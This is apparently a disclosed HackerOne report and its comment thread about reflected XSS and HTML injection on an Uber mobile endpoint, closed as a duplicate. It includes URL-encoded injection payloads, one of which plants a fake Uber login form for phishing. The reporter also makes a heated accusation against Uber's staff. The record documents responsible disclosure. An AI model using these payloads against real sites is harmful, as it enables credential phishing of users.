{"id":300103,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDAxMDM=","url":"https://hackerone.com/reports/300103","title":"udi-id Query Parameter Can Generate SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint","state":"Closed","substate":"duplicate","severity_rating":"critical","readable_substate":"Duplicate","created_at":"2017-12-22T19:04:33.030Z","submitted_at":"2017-12-22T19:04:33.030Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"gregoryvperry","url":"/gregoryvperry","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-12-26T11:04:34.017Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-12-24T20:46:49.727Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\nThe udi-id request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.\n\n## Security Impact\nUsing the udi-id query variable, arbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.\n\n## Reproduction Steps\nhttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?udi-id=\"%7D}\u003c/script\u003e\u003cdiv%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27\u003e\u003ca%20href%3D\"http%3A%2F%2Fwww.lyft.com\"\u003eSome%20arbitrary%20link%20text\u003c%2Fa\u003e\u003c%2Fdiv\u003e%0A\n\n## Impact\n\nWith a properly crafted javascript and/or html page, an attacker could harvest Uber login and password credentials, credit card payment information etc.","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":276134,"original_report_url":"https://hackerone.com/reports/276134","attachments":[],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["fa1rlight","muhammad_uwais","gregoryvperry"],"severity":{"rating":"critical","score":9.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2243170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@gregperry -- We're looking into this, but our preliminary investigation suggests that all of these behaviors are related. We ask that you put all the information into one report - our bounties are based on overall security impact, submitting multiples reports for the same issue will not lead to higher bounties.","automated_response":false,"created_at":"2017-12-22T19:21:09.568Z","updated_at":"2017-12-22T19:21:09.568Z","actor":{"username":"lindsey-uber","cleared":false,"url":"/lindsey-uber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243266,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well. According to Rob Fletcher this is not even an in-scope vulnerability, despite the fact that it maps almost exactly to Uber's sample report:\n\n```\n ## Summary\nreflected XSS in partners.uber.com\n\n## Security Impact\nSince partners.uber.com has an authenticated experience, an XSS in this domain\nmeans an attacker can forge authenticated requests on behalf of the victim.\nAlso, advanced phishing attacks and defacement are possible.\n\n## Reproduction Steps\nThis is a reflected XSS in `partners.uber.com/ via the `lang` querystring\nparameter via the route `/documents`.\n```\n\nSo at this point this is blatant employment discrimination by Uber.","automated_response":false,"created_at":"2017-12-22T20:04:12.702Z","updated_at":"2017-12-22T20:04:12.702Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243278,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We've not made any decision at this point -- the only thing I said was that if you cannot get Javascript execution, this will not be considered XSS. If HTML injection is possible, this will likely be in-scope for our Phishing security impact bucket. If this is only text injection, it will be out of scope per our program guidelines.\n\nPlease just be patient while we work through your reports and if they are valid they will be recognized at such.","automated_response":false,"created_at":"2017-12-22T20:11:05.653Z","updated_at":"2017-12-22T20:11:05.653Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243298,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a login form. Not properly formatted, because I am not a web developer or professional phisher.\n\nhttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?udi-id%3D%22%7D%7D%3C%2Fscript%3E%3Cdiv%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27%3E%3Ch2%3ELogin%20to%20your%20Uber%20account%3C%2Fh2%3E%3Cform%3E%3Cinput%20type%3D%27text%27%20title%3D%27username%27%20placeholder%3D%27username%27%20%2F%3E%3Cinput%20type%3D%27password%27%20title%3D%27username%27%20placeholder%3D%27password%27%20%2F%3E%3Cbutton%20type%3D%27submit%27%20class%3D%27btn%27%3ELogin%3C%2Fbutton%3E%3Ca%20class%3D%27forgot%27%20href%3D%27%23%27%3EForgot%20Your%20Uber%20Username%3F%3C%2Fa%3E%3C%2Fform%3E%3C%2Fdiv%3E","automated_response":false,"created_at":"2017-12-22T20:25:48.833Z","updated_at":"2017-12-22T20:25:48.833Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243303,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Most of this could probably be fixed by adding single quote escaping to your XSS filter or WAF.","automated_response":false,"created_at":"2017-12-22T20:27:03.176Z","updated_at":"2017-12-22T20:27:03.176Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Perfect, thank you -- with this HTML injection, this would land in our Phishing security impact bucket:\n```\nPhishing: (almost all examples of Phishing end up out-of-scope) the ability to carry out targeted and convincing phishing on Uber users.\n\nin-scope vulnerability class examples:\n* HTML injection on www.uber.com allowing for convincing phishing.\n...\n```\n\nWe're going through our final validations and will follow-up soon.","automated_response":false,"created_at":"2017-12-22T20:28:06.643Z","updated_at":"2017-12-22T20:28:06.643Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243675,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As Lindsey has verified that javascript can be executed via the script-src whitelist and wildcard *.cloudfront.net host, it would appear that this is two separate issues: a javascript execution vulnerability for the XSS bucket as well as an HTML injection vulnerability for the advanced phishing bucket.\n\nHopefully I will not be penalized for having lumped these two issues into the same report? ","automated_response":false,"created_at":"2017-12-23T01:27:00.728Z","updated_at":"2017-12-23T01:27:00.728Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243685,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"@gregperry -- the behaviors described in this report will be resolved with the fix for #276134. As such, we are closing this report as a duplicate. ","automated_response":false,"created_at":"2017-12-23T01:36:32.822Z","updated_at":"2017-12-23T01:36:32.822Z","original_report_id":276134,"actor":{"username":"lindsey-uber","cleared":false,"url":"/lindsey-uber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243686,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2017-12-23T01:36:41.167Z","updated_at":"2017-12-23T01:36:41.167Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2245246,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-12-24T20:46:49.757Z","updated_at":"2017-12-24T20:46:49.757Z","first_to_agree":true,"actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2246688,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2017-12-26T11:04:33.921Z","updated_at":"2017-12-26T11:04:33.921Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}